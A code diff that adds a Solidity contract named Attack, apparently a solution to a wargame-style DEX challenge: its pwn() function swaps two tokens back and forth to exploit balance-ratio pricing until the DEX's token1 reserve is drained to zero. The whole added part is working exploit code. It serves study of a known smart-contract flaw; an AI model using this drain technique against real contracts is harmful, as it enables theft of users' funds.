@@ -1,8 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
-
-
 interface IERC20 {
     function totalSupply() external view returns (uint);
 
@@ -41,3 +39,41 @@ interface IDex {
     function swap(address from, address to, uint amount) external;
 }
 
+contract Attack {
+    IDex private immutable dex;
+    IERC20 private immutable token1;
+    IERC20 private immutable token2;
+
+    constructor(IDex _dex) payable{
+        dex = _dex;
+        token1 = IERC20(dex.token1());
+        token2 = IERC20(dex.token2());
+    }
+
+    function pwn() external {
+        token1.transferFrom(msg.sender, address(this), 10);
+        token2.transferFrom(msg.sender, address(this), 10);
+
+        token1.approve(address(dex), type(uint).max);
+        token2.approve(address(dex), type(uint).max);
+
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+        _swap(token2, token1);
+        _swap(token1, token2);
+
+        dex.swap(address(token2), address(token1), 45);
+
+        require(token1.balanceOf(address(dex)) == 0, "dex balance != 0");
+    }
+
+    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
+        dex.swap(
+            address(tokenIn),
+            address(tokenOut),
+            tokenIn.balanceOf(address(this))
+        );
+    }
+}
+//0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F
